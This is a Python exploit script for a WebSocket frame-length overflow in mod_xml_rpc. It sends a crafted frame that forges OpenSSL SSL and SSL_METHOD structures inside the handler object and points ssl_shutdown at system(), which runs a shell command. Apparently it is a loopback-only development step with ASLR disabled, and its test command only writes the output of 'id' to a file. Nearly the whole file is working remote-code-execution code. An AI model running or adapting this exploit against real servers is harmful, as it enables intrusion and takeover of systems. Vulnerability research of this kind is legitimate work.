#!/usr/bin/env python3
"""Loopback-only rung-5 forged-SSL client for mod_xml_rpc WebSocket overflow.

The payload is byte-for-byte the known-good rung-4 sentinel frame (all 'A',
TARGET at index 131094) except for the six regions that build a forged SSL
object and SSL_METHOD inside wsh. Every structural address is carried in the
wire payload; the debugger only runs the process with ASLR disabled.

Mapping validated by the live rung-4 trace: payload index i -> wsh + i + 18.
"""
import socket
import struct
import sys

HOST = "127.0.0.1"
MODE = sys.argv[1] if len(sys.argv) > 1 else "exploit"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 18080
WSH = int(sys.argv[3], 16)
SYS = int(sys.argv[4], 16)
MARKER = sys.argv[5] if len(sys.argv) > 5 else "r5"
CMD = ("id>" + MARKER + "\0").encode()

SSL_OFF = 64      # forged SSL object at wsh+64
METH_OFF = 512    # forged SSL_METHOD at wsh+512
PAYLOAD_LEN = 131102
BASE_DELTA = 18   # payload index -> wsh offset


def pl(offset):
    return offset - BASE_DELTA


def put64(buf, wsh_offset, value):
    struct.pack_into("<Q", buf, pl(wsh_offset), value & 0xFFFFFFFFFFFFFFFF)


header = bytes([0x81, 0x7F]) + bytes.fromhex("7fffffff00000000")
payload = bytearray(b"A" * PAYLOAD_LEN)

# Command string at the forged SSL object's offset 0 (rdi to system()).
pi = pl(SSL_OFF)
payload[pi:pi + len(CMD)] = CMD

# SSL->method (SSL+8) -> forged SSL_METHOD.
put64(payload, SSL_OFF + 8, WSH + METH_OFF)

# method->ssl_shutdown (SSL_METHOD+0x50) -> calibrated system().
put64(payload, METH_OFF + 0x50, SYS)

# SSL+0x30 is nonzero already ('A' filler): passes the first gate.
# SSL+0x64 read by SSL_in_init must be zero.
put64(payload, SSL_OFF + 0x64, 0)

# SSL+0x9f1 bit0 must be clear (ASYNC path gate).
put64(payload, SSL_OFF + 0x9F1, 0)

# wsh->ssl -> forged SSL object.
put64(payload, 131112, WSH + SSL_OFF)

s = socket.create_connection((HOST, PORT), timeout=5)
req = (
    "GET /socket HTTP/1.1\r\n"
    f"Host: {HOST}:{PORT}\r\n"
    "Upgrade: websocket\r\n"
    "Connection: Upgrade\r\n"
    "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
    "Sec-WebSocket-Version: 13\r\n"
    "Sec-WebSocket-Protocol: websocket\r\n"
    "\r\n"
)
s.sendall(req.encode())
resp = b""
while b"\r\n\r\n" not in resp:
    chunk = s.recv(4096)
    if not chunk:
        break
    resp += chunk
print("UPGRADE_RESPONSE=", resp.split(b"\r\n", 1)[0].decode(errors="replace"), flush=True)
print("UPGRADE_101=", b"101" in resp.split(b"\r\n", 1)[0], flush=True)
s.sendall(header + payload)
print("SENT_FRAME=", len(header) + len(payload), flush=True)
print("FAKE_SSL=", hex(WSH + SSL_OFF), "FAKE_METHOD=", hex(WSH + METH_OFF),
      "SYSTEM=", hex(SYS), "CMD=", CMD.rstrip(b"\0").decode(), flush=True)
try:
    s.shutdown(socket.SHUT_WR)
except OSError:
    pass
s.settimeout(3)
try:
    tail = s.recv(256)
    print("TAIL=", tail[:120].hex(), flush=True)
except Exception as exc:
    print("TAIL_EXC=", type(exc).__name__, str(exc), flush=True)
s.close()
